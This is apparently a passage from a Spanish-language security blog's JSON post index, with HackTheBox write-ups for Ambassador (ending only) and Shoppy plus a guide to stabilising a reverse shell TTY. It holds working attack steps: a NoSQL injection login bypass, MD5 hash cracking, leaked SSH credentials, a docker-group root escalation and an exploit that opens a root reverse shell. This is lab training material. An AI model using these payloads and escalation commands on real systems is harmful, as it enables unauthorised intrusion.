escuchadeveloper@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ❯ nc -nlvp 123listening on [any] 123 ...Al ejecutarlo nos debe llegar la shell como root❯ nc -nlvp 123listening on [any] 123 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732bash: cannot set terminal process group (3731): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# Ahora podemos vizualizar la flag como rootroot@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt 5a4**************************4b1root@ambassador:~# "
  },
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, no sql, docker, easy, virtual hosting",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  },
  
  {
    "title": "Tratamiento de la TTY",
    "url": "/posts/tty/",
    "categories": "pentesting, machine",
    "tags": "tty",
    "date": "2022-02-03 17:00:00 +0100",
    





    "snippet": "Una vez que ganamos acceso a un servidor por medio de una reverse shell no será interactiva al 100%, para solucionar estó debemos aplicar un tratamiento a la TTY, al aplicar este tratamiento podemos hacer Ctrl + C sin miedo a perder la Shell y tambien limpiar la pantalla y tabular para el autocompletado.Tratamientoroot@f5fd61010b2d:~$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullroot@f5fd61010b2d:~$ Presionamos Ctrl + Z para suspender la shellroot@f5fd61010b2d:~$ ^Zzsh: suspended  nc -lvnp 444Reiniciamos la shell y configuramos el tipo de terminal❯ stty raw -echo; fg❯ stty raw -echo; fg[1]  + continued  nc -lvnp 444                              reset xtermYa podemos aplicar Ctrl + C y no perderemos la conexión, pero el Ctrl + L no funciona, para ello cambiamos la variable de entorno TERM a xtermroot@f5fd61010b2d:~$ export TERM=xtermA veces la variable SHELL vale nologin, hacemos lo siguiente para que sea una shellroot@f5fd61010b2d:~$ export SHELL=/bin/bashYa tenemos una consola semi-interactiva, para que sea full-interactiva debemos cambiar las filas y columnas, en la mæquina victima hacemos un:root@f5fd61010b2d:~$ stty size24 80root@f5fd61010b2d:~$ Y en nuestra máquina hacemos lo mismo y confirmamos que los valores no coinciden.❯ stty size48 184Regresamos a la máquina victima y cambiamos los valoresroot@f5fd61010b2d:~$ stty rows 48 columns 184        root@f5fd61010b2d:~$ Una vez hecho esto nuestra TTY ya sera 100% interactiva."
  }
  
]

